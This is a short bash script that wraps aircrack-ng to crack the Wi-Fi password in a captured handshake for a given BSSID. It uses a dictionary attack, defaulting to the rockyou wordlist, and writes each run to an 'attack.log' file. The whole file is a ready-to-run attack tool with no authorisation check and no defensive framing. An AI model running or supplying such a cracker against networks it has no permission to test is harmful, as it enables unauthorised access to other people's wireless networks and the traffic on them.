#!/usr/bin/env bash
set -euo pipefail

CAPFILE=""
BSSID=""
WORDLIST="/usr/share/wordlists/rockyou.txt"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --cap) CAPFILE="$2"; shift 2 ;;
    --bssid) BSSID="$2"; shift 2 ;;
    --wordlist) WORDLIST="$2"; shift 2 ;;
    *) echo "Unknown arg $1"; exit 1 ;;
  esac
done

if [[ -z "$CAPFILE" || -z "$BSSID" ]]; then
  echo "Missing params" >&2
  exit 2
fi

echo "$(date --iso-8601=seconds) cracking bssid=$BSSID cap=$CAPFILE" >> "$(dirname "$0")/attack.log"
sudo aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE"
